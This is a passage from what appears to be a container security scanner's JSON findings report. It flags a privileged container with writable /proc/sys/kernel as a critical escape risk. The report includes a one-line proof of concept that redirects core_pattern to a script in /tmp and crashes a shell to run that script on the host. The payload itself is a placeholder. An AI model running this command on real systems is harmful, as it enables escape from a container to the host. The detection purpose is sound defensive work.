          "ruleId": "writable_proc_privileged",
          "level": "error",
          "message": {
            "text": "Container escape chain detected (severity=critical, score=0.76).\n\nChain: Writable procfs + privileged \u2014 kernel manipulation\n\nPrivileged container with writable /proc/sys/kernel allows core_pattern abuse and other kernel parameter manipulation.",
            "markdown": "### Writable procfs + privileged \u2014 kernel manipulation\n\n**Severity:** critical \u00b7 **Composite score:** 0.76\n\n**PoC:**\n```sh\necho '|/tmp/payload.sh' > /proc/sys/kernel/core_pattern && echo '#!/bin/sh' > /tmp/payload.sh && echo '{payload_command}' >> /tmp/payload.sh && chmod +x /tmp/payload.sh && kill -SEGV $$\n```"
